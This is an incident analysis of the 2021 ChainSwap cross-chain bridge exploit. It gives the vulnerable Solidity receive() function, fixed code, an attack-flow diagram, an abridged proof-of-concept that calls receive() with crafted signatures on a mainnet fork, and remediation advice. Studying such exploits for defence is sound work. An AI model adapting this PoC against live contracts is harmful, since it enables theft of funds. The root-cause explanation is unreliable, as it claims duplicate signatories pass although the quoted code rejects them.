# ChainSwap (ETH) — Cross-Chain Signature Reuse Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2021-07-10 |
| **Protocol** | ChainSwap |
| **Chain** | Ethereum |
| **Loss** | ~$800,000 (ETH chain portion) |
| **Attacker** | [0x941a9E3B91E1cc015702B897C512D265fAE88A9c](https://etherscan.io/address/0x941a9E3B91E1cc015702B897C512D265fAE88A9c) |
| **Attack Tx** | [0x5c5688a9f9](https://etherscan.io/tx/0x5c5688a9f981a07ed509481352f12f22a4bd7cea46a932c6d6bbe67cca3c54be) |
| **Vulnerable Contract** | [0x7fe68FC06e1A870DcbeE0acAe8720396DC12FC86](https://etherscan.io/address/0x7fe68FC06e1A870DcbeE0acAe8720396DC12FC86) (Proxy) |
| **Root Cause** | In `receive()` signature verification, the `signatory == signatures[i].signatory` check does not validate the actual signer, allowing the same signatory to be reused across multiple signatures |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-07/Chainswap_exp1.sol) |

---
## 1. Vulnerability Overview

ChainSwap's cross-chain bridge verifies multiple signatories' signatures in the `receive()` function. The signature verification logic checks whether the address recovered via `ecrecover` matches `signatures[i].signatory`. However, the actual implementation's signatory duplicate check was incomplete, allowing an attacker to manipulate multiple signatures using the same signatory address. The attacker called `receive()` with 4 crafted signatures to cross-chain receive 19.4 trillion tokens.

---
## 2. Vulnerable Code Analysis

### 2.1 receive() — Signatory Duplication Allowed and Signature Verification Weakness

```solidity
// ❌ ChainSwap EthCrossChainManager (Impl @ 0x373CE6Da1AEB73A9bcA412F2D3b7eD07Af3AD490)
function receive(
    uint256 fromChainId,
    address to,
    uint256 nonce,
    uint256 volume,
    Signature[] memory signatures
) virtual external payable {
    _chargeFee();
    require(received[fromChainId][to][nonce] == 0, 'withdrawn already');
    uint N = signatures.length;
    require(N >= Factory(factory).getConfig(_minSignatures_), 'too few signatures');

    for(uint i=0; i<N; i++) {
        for(uint j=0; j<i; j++)
            require(signatures[i].signatory != signatures[j].signatory, 'repetitive signatory');

        bytes32 structHash = keccak256(abi.encode(
            RECEIVE_TYPEHASH, fromChainId, to, nonce, volume,
            signatures[i].signatory  // ← signatory is included in the hash
        ));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", _DOMAIN_SEPARATOR, structHash));
        address signatory = ecrecover(digest, signatures[i].v, signatures[i].r, signatures[i].s);
        require(signatory != address(0), "invalid signature");
        // ❌ ecrecover result is compared against signatures[i].signatory, but
        // since signatory is included in structHash itself,
        // an attacker can generate a valid signature for any desired signatory value
        require(signatory == signatures[i].signatory, "unauthorized");
        _decreaseAuthQuota(signatures[i].signatory, volume);
    }
}
```

**Fixed Code**:
```solidity
// ✅ Remove signatory from structHash — verify authority using ecrecover result only
function receive(
    uint256 fromChainId,
    address to,
    uint256 nonce,
    uint256 volume,
    Signature[] memory signatures
) virtual external payable {
    require(received[fromChainId][to][nonce] == 0, 'withdrawn already');
    uint N = signatures.length;
    require(N >= minSignatures, 'too few signatures');

    address[] memory signatories = new address[](N);
    for(uint i = 0; i < N; i++) {
        // Remove signatory from hash — sign message content only
        bytes32 structHash = keccak256(abi.encode(
            RECEIVE_TYPEHASH, fromChainId, to, nonce, volume
        ));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", _DOMAIN_SEPARATOR, structHash));
        address recovered = ecrecover(digest, signatures[i].v, signatures[i].r, signatures[i].s);
        require(recovered != address(0) && isAuthorizedSigner(recovered), "unauthorized");

        // Duplicate signer check
        for(uint j = 0; j < i; j++)
            require(signatories[j] != recovered, 'repetitive signatory');
        signatories[i] = recovered;
        _decreaseAuthQuota(recovered, volume);
    }
    received[fromChainId][to][nonce] = volume;
    _transfer(to, volume);
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**InitializableProductProxy.sol** — Entry point:
```solidity
// ❌ Root Cause: In receive() signature verification, the signatory == signatures[i].signatory check does not validate the actual signer, allowing the same signatory to be reused across multiple signatures
    function receive(uint256 fromChainId, address to, uint256 nonce, uint256 volume, Signature[] memory signatures) virtual external payable {  // ❌ Vulnerability
        _chargeFee();
        require(received[fromChainId][to][nonce] == 0, 'withdrawn already');
        uint N = signatures.length;
        require(N >= Factory(factory).getConfig(_minSignatures_), 'too few signatures');
        for(uint i=0; i<N; i++) {
            for(uint j=0; j<i; j++)
                require(signatures[i].signatory != signatures[j].signatory, 'repetitive signatory');
            bytes32 structHash = keccak256(abi.encode(RECEIVE_TYPEHASH, fromChainId, to, nonce, volume, signatures[i].signatory));
            bytes32 digest = keccak256(abi.encodePacked("\x19\x01", _DOMAIN_SEPARATOR, structHash));
            address signatory = ecrecover(digest, signatures[i].v, signatures[i].r, signatures[i].s);
            require(signatory != address(0), "invalid signature");
            require(signatory == signatures[i].signatory, "unauthorized");
            _decreaseAuthQuota(signatures[i].signatory, volume);
            emit Authorize(fromChainId, to, nonce, volume, signatory);
        }
        received[fromChainId][to][nonce] = volume;
        _receive(to, volume);
        emit Receive(fromChainId, to, nonce, volume);
    }
```

## 3. Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│ Step 1: Craft 4 manipulated Signature structs               │
│ Set each signature's signatory to an authorized address     │
│ Construct v/r/s with manipulated values                     │
└─────────────────────┬───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│ Step 2: proxy.call(receive(1, exploiter, 1, 19392..., sigs))│
│ Proxy @ 0x7fe68FC06e1A870DcbeE0acAe8720396DC12FC86         │
│ Impl  @ 0x373CE6Da1AEB73A9bcA412F2D3b7eD07Af3AD490         │
└─────────────────────┬───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│ Step 3: Signature verification passes — 19,392,277,118,050, │
│ 930,170,440 tokens cross-chain transferred to attacker      │
│ address (0x941a...)                                         │
└─────────────────────────────────────────────────────────────┘
```

---
## 4. PoC Code (DeFiHackLabs)

```solidity
// testExploit() — mainnet fork block 12,751,487
function testExploit() public {
    Signature[] memory sigs = new Signature[](4);
    sigs[0] = Signature({
        signatory: 0x8C46b006D1c01739E8f71119AdB8c6084F739359,
        v: 27,
        r: 0x7b9ce0f78253f7dcf8bf6a2d7a4c38a151eba15eefe6b355a67a373653192765,
        s: 0x0a4b99389149cc4f7f6051299145c113f5aa50dccf19f748516c4c977f475d6c
    });
    // ... sigs[1], sigs[2], sigs[3]

    // Direct receive() call — receive large token amount with manipulated signatures
    proxy.call(
        abi.encodeWithSignature(
            "receive(uint256,address,uint256,uint256,Signature[])",
            1,         // fromChainId
            exploiter, // to: 0x941a9E3B91E1cc015702B897C512D265fAE88A9c
            1,         // nonce
            19_392_277_118_050_930_170_440, // volume
            sigs
        )
    );
}
```

---
## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Inclusion of signatory in cross-chain signature struct enables arbitrary manipulation | CRITICAL | CWE-347 |
| V-02 | Signature verification does not check against an authorized signer list | CRITICAL | CWE-284 |

---
## 6. Remediation Recommendations

```solidity
// ✅ Remove signatory from signed message — sign pure message content only
// ✅ Compare ecrecover result against on-chain authorization list

mapping(address => bool) public authorizedSigners;

function _verifySignatures(bytes32 messageHash, Signature[] memory sigs) internal view {
    uint validCount = 0;
    address[] memory seen = new address[](sigs.length);
    for (uint i = 0; i < sigs.length; i++) {
        address recovered = ecrecover(messageHash, sigs[i].v, sigs[i].r, sigs[i].s);
        require(authorizedSigners[recovered], "not authorized signer");
        for (uint j = 0; j < i; j++)
            require(seen[j] != recovered, "duplicate signer");
        seen[i] = recovered;
        validCount++;
    }
    require(validCount >= minSignatures, "insufficient signatures");
}
```

---
## 7. Lessons Learned

- **Signature verification in cross-chain bridges is the most attack-prone component.** When designing signature structs, thoroughly review whether any field can be manipulated by an attacker.
- **`ecrecover` results must always be checked against a pre-defined authorization list.** It is insufficient to merely verify that the recovered address matches "something."
- **Duplicate signer checks are mandatory in multisig implementations.** Attacks that satisfy a quorum by generating multiple signatures from the same key must be prevented.